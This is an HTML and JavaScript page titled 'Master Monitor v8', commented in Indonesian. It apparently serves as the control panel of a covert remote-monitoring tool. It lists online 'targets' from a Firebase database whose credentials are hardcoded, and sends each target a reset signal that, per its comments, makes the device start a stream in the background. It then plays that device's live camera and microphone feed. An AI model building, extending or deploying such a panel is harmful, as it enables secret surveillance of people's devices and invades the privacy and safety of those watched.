<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>Master Monitor v8</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        body { background: #000; color: #00ff00; font-family: 'Courier New', monospace; margin: 0; display: flex; height: 100vh; }
        #sidebar { width: 250px; border-right: 1px solid #00ff00; padding: 15px; overflow-y: auto; background: #050505; }
        #main { flex: 1; padding: 20px; display: flex; flex-direction: column; background: #000; }
        .tgt-card { border: 1px solid #00ff00; padding: 12px; margin-bottom: 10px; cursor: pointer; text-align: center; border-radius: 5px; }
        .tgt-card:hover { background: #002200; }
        .active { background: #00ff00 !important; color: #000; font-weight: bold; box-shadow: 0 0 15px #00ff00; }
        #video-container { flex: 1; background: #000; border: 2px solid #00ff00; position: relative; border-radius: 10px; overflow: hidden; display: flex; align-items: center; justify-content: center; }
        video { width: 100%; height: 100%; object-fit: contain; }
        #click-trigger { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); 
                         color: #00ff00; display: flex; align-items: center; justify-content: center; cursor: pointer; z-index: 99; text-align: center; padding: 20px; }
        .hide { display: none !important; }
    </style>
</head>
<body>
    <div id="sidebar">
        <h3 style="text-align:center; border-bottom: 1px solid #00ff00; padding-bottom: 10px;">LIST TARGET</h3>
        <div id="target-list">Mencari...</div>
    </div>
    <div id="main">
        <div id="video-container">
            <div id="click-trigger">KLIK UNTUK AKTIFKAN SUARA & PANEL</div>
            <video id="rv" autoplay playsinline></video>
        </div>
        <div id="status-info" style="margin-top: 15px; border: 1px solid #333; padding: 10px;">Pilih target untuk memulai.</div>
    </div>

    <script>
        const config = {
            apiKey: "AIzaSyAQn-HOc2ut9_Dcw0LiPhvUMfzrjaLhj2Q",
            databaseURL: "https://chatroom-e9b3f-default-rtdb.asia-southeast1.firebasedatabase.app",
            projectId: "chatroom-e9b3f"
        };
        firebase.initializeApp(config);
        const rootDb = firebase.database().ref('v8_auto_sync');

        let activeTargetId = null;
        let pc = null;
        let audioReady = false;

        document.getElementById('click-trigger').onclick = function() {
            this.classList.add('hide');
            audioReady = true;
            document.getElementById('rv').play();
        };

        // Pantau daftar target yang online
        rootDb.on('value', snapshot => {
            const list = document.getElementById('target-list');
            list.innerHTML = "";
            const data = snapshot.val();
            if (!data) return;

            Object.keys(data).forEach(id => {
                const target = data[id];
                const isOnline = (Date.now() - (target.presence || 0)) < 12000;
                
                if (isOnline) {
                    const el = document.createElement('div');
                    el.className = `tgt-card ${id === activeTargetId ? 'active' : ''}`;
                    el.innerHTML = `ID: ${id}<br><small>STATUS: LIVE</small>`;
                    el.onclick = () => selectTarget(id);
                    list.appendChild(el);

                    // Jika target yang sedang aktif kirim offer baru (setelah dipicu reset_signal)
                    if (id === activeTargetId && target.sdp && target.sdp.offer && target.sdp.offer.ts > (window.lastOfferTime || 0)) {
                        window.lastOfferTime = target.sdp.offer.ts;
                        startConnection(id, target.sdp.offer);
                    }
                }
            });
        });

        async function selectTarget(id) {
            activeTargetId = id;
            window.lastOfferTime = 0;
            document.getElementById('status-info').innerText = `Memicu rekoneksi ke ${id}...`;

            // Kirim sinyal RESET ke Firebase. 
            // Target akan mendeteksi ini dan menjalankan createNewOffer() di latar belakang.
            rootDb.child(id + '/reset_signal').set(Date.now());
        }

        async function startConnection(id, offer) {
            console.log("Menghubungkan ke " + id);
            if (pc) pc.close();
            pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });

            pc.ontrack = e => {
                const rv = document.getElementById('rv');
                rv.srcObject = e.streams[0];
                if(audioReady) rv.muted = false;
            };

            pc.onicecandidate = e => {
                if (e.candidate) rootDb.child(id + '/ice_m').push(e.candidate.toJSON());
            };

            await pc.setRemoteDescription(new RTCSessionDescription(offer));
            const answer = await pc.createAnswer();
            await pc.setLocalDescription(answer);
            rootDb.child(id + '/sdp/answer').set({ type: answer.type, sdp: answer.sdp });

            // Listen ICE Candidates dari Target
            rootDb.child(id + '/ice_t').off();
            rootDb.child(id + '/ice_t').on('child_added', s => {
                pc.addIceCandidate(new RTCIceCandidate(s.val())).catch(e=>{});
            });
            
            document.getElementById('status-info').innerText = `Tersambung ke ${id}.`;
        }
    </script>
</body>
</html>
